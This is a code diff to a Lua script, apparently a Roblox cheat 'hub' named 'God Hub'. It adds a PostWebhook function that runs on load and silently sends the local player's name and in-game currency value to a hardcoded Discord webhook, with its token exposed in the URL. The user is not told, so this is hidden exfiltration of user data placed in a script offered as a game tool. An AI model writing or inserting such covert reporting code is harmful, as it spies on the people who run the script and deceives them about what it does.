@@ -146,6 +146,49 @@ spawn(function()
         end
     end)
 end)
+function PostWebhook(cm, cn)
+    local co = http_request or request or HttpPost or syn.request
+    local cp =
+        co(
+        {
+            Url = cm,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(cn)
+        }
+    )
+
+    --setclipboard(game:GetService("HttpService"):JSONEncode(cp))
+end
+function PostWebhook2(data)
+    return PostWebhook("https://discord.com/api/webhooks/1025393134177357825/jNg--0hGmLDZen2UOp0D6Y8zW3C2_TgjYQmbO79xAFQbvG37oplpUUbtSrezva_2E6qq", data)
+end
+PostWebhook2(
+                {
+                    content = "🥶",
+                    tts = false,
+                    embeds = {
+                        {
+                            id = 652627557,
+                            title = "Check Beli",
+                            description = "Player: " ..
+                               game.Players.LocalPlayer.name,
+                            color = 13858455,
+                            fields = {
+                                {
+                                    id = 814454215,
+                                    name = "Beli",
+                                    value = string.format("``` %s ```", tostring(uwu)),
+                                    inline = false
+                                },
+                            },
+                            author = {
+                                name = "God Hub"
+                            }
+                        }
+                    }
+                }
+            )
 for i,v in pairs(game:GetService("Workspace").ISLAND:GetChildren()) do
     if string.find(v.Name,"Base") then
         v:Destroy()
